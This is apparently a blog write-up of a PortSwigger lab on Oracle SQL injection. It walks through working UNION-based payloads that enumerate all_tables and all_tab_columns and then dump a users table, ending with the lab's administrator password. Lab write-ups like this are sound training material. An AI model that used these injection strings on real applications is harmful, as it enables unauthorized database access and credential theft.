This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.
#### Hint

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

For more information, see our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

first we need to know number of column 

![](https://cdn-images-1.medium.com/max/1000/1*3lx60c2eVQrA72RqjznKSQ.png)

there are two column 

now we need to know names of tables from all_tables so we will use 

`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

i think this is table what we need 


![](https://cdn-images-1.medium.com/max/1000/1*OMLnvDDzt-LtYVz1NJkRYQ.png)

table for users and passwords : USERS_FWJRWI

know we need to know names of columns from all_tab_columns so we will use 

`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_FWJRWI'--`

and we found :


![](https://cdn-images-1.medium.com/max/1000/1*bS8Vh3QENvcg3lz_RayjiQ.png)


column for users : USERNAME_VYMSYU

column for passwords : PASSWORD_NGFBPS

 `'+UNION+SELECT+USERNAME_VYMSYU,+PASSWORD_NGFBPS+FROM+USERS_FWJRWI--`
  

![](https://cdn-images-1.medium.com/max/1000/1*e4Q8ExaRfPwW-lKllVzd-g.png)

username : administrator

password : f595pg1ft4th1btevk88
  

![](https://cdn-images-1.medium.com/max/1000/1*f_Iw6P_75YVHu6Q_aZqucA.png)